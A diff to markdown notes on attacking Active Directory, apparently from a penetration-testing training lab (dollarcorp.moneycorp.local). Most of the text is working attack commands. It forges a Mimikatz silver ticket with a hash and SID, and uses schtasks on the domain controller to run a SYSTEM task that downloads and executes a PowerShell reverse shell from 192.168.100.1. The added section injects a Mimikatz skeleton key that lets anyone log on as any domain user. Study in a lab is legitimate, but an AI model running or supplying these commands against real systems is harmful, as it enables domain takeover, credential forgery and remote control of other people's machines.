@@ -18,6 +18,7 @@ Use hash of service account - In this case dcorp-dc$
 Invoke-Mimikatz -Command '"kerberos::golden /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /target:dcorp-dc.dollarcorp.moneycorp.local /service:HOST /rc4:6f5b5acaf7433b3282ac22e21e62ff22 /user:Administrator /ptt"'
 ```
 
+
 ## Avaiable services
 >image form [Hacktrick](https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/silver-ticket)
 
@@ -39,4 +40,17 @@ schtasks /S dcorp-dc.dollarcorp.moneycorp.local
 schtasks /create /S dcorp-dc.dollarcorp.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://192.168.100.1:8080/Invoke-PowerShellTcp.ps1''')'"
 # Run
 schtasks /Run /S dcorp-dc.dollarcorp.moneycorp.local /TN "STCheck"
+```
+to do
+- add other services
+
+
+## Skeleton key
+Inject skeleton key
+```powershell
+Invoke-Mimikatz -Command '"privilege::debug" "misc::skeleton"'
+```
+Access any computer as any user on the domain using password **mimikatz**
+```powershell
+Enter-PSSession -ComputerName dcorp-dc.dollarcorp.moneycorp.local -Credential dcorp\administrator
 ```
